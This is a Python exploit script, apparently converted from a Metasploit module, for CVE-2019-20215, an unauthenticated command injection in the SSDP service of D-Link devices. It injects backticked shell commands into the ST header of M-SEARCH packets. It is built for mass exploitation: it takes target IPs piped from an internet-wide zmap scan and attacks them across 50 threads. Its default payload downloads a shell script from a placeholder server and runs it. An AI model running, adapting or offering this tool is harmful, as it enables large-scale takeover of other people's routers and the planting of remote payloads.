#!/usr/bin/env python3
"""
D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi
Конвертированный из Ruby Metasploit модуля
Работает с zmap: zmap -p 1900 -B 10M | python3 main.py
CVE-2019-20215
"""

import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor

class DLinkExploit:
    def __init__(self):
        self.rport = 1900  # SSDP port
        self.timeout = 5
        self.vector = "URN"  # URN или UUID
        
    def print_status(self, message):
        print(f"[*] {message}")
        
    def print_good(self, message):
        print(f"[+] {message}")
        
    def print_error(self, message):
        print(f"[-] {message}")

    def execute_command(self, target_ip, cmd):
        """
        Конвертированная функция execute_command из Ruby кода
        """
        try:
            # Выбор вектора атаки (как в оригинальном Ruby коде)
            if self.vector == "URN":
                self.print_status("Target Payload URN")
                val = f"urn:device:1;`{cmd}`"
            else:
                self.print_status("Target Payload UUID") 
                val = f"uuid:`{cmd}`"

            # Создание UDP соединения (connect_udp из Ruby)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            
            # Формирование SSDP пакета (точно как в Ruby коде)
            header = "M-SEARCH * HTTP/1.1\r\n"
            header += f"Host:239.255.255.250: {self.rport}\r\n"
            header += f"ST:{val}\r\n"
            header += "Man:\"ssdp:discover\"\r\n"
            header += "MX:2\r\n\r\n"
            
            # Отправка пакета (udp_sock.put из Ruby)
            sock.sendto(header.encode(), (target_ip, self.rport))
            
            # Закрытие соединения (disconnect_udp из Ruby)
            sock.close()
            
            self.print_good(f"Эксплоит отправлен на {target_ip}")
            return True
            
        except Exception as e:
            self.print_error(f"Ошибка при атаке {target_ip}: {e}")
            return False

    def exploit(self, target_ip, command="id"):
        """
        Основная функция эксплуатации (аналог def exploit из Ruby)
        """
        self.print_status(f"Начинаем атаку на {target_ip}")
        self.print_status(f"Команда: {command}")
        self.print_status(f"Вектор: {self.vector}")
        
        # Выполняем команду (execute_cmdstager из Ruby упрощен до прямого выполнения)
        return self.execute_command(target_ip, command)

    def set_vector(self, vector):
        """Установка вектора атаки: URN или UUID"""
        if vector in ["URN", "UUID"]:
            self.vector = vector
            self.print_status(f"Вектор установлен: {vector}")
        else:
            self.print_error("Неверный вектор. Используйте URN или UUID")

def exploit_target(args):
    """Функция для многопоточной атаки"""
    ip, command, vector = args
    exploit = DLinkExploit()
    exploit.set_vector(vector)
    return exploit.exploit(ip, command)

def main():
    print("=" * 70)
    print("D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi")
    print("Конвертировано из Ruby Metasploit модуля в Python")
    print("CVE-2019-20215")
    print("Авторы оригинального модуля: s1kr10s, secenv")
    print("=" * 70)
    print()
    
    # Настройки по умолчанию (как в Ruby коде)
    default_command = "wget http://your-server/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh"
    default_vector = "URN"
    
    # Проверка аргументов
    if len(sys.argv) > 1:
        if sys.argv[1] in ["-h", "--help"]:
            print("Использование:")
            print("  zmap -p 1900 -B 10M | python3 main.py [команда] [вектор]")
            print("  echo '192.168.1.1' | python3 main.py")
            print()
            print("Параметры:")
            print("  команда  - команда для выполнения (по умолчанию: id)")
            print("  вектор   - URN или UUID (по умолчанию: URN)")
            print()
            print("Примеры:")
            print("  zmap -p 1900 -B 10M | python3 main.py 'id' URN")
            print("  echo '192.168.1.100' | python3 main.py 'whoami' UUID")
            return
        
        default_command = sys.argv[1]
        
    if len(sys.argv) > 2:
        default_vector = sys.argv[2]
    
    print(f"[*] Команда для выполнения: {default_command}")
    print(f"[*] Вектор атаки: {default_vector}")
    print(f"[*] Порт: 1900 (SSDP)")
    print("[*] Чтение IP адресов из stdin...")
    print("[*] Используйте: zmap -p 1900 -B 10M | python3 main.py")
    print()
    
    targets = []
    
    try:
        # Чтение IP адресов из stdin (для работы с zmap)
        for line in sys.stdin:
            ip = line.strip()
            if ip:
                targets.append((ip, default_command, default_vector))
    except KeyboardInterrupt:
        print("\n[*] Прервано пользователем")
    
    if not targets:
        print("[*] IP адреса не найдены")
        return
    
    print(f"[*] Найдено целей: {len(targets)}")
    print("[*] Начинаем атаку...")
    print()
    
    # Многопоточная атака
    successful = 0
    with ThreadPoolExecutor(max_workers=50) as executor:
        results = executor.map(exploit_target, targets)
        for result in results:
            if result:
                successful += 1
    
    print()
    print("=" * 50)
    print(f"[*] Атака завершена")
    print(f"[*] Обработано целей: {len(targets)}")
    print(f"[*] Успешных атак: {successful}")
    print("=" * 50)

if __name__ == "__main__":
    main()
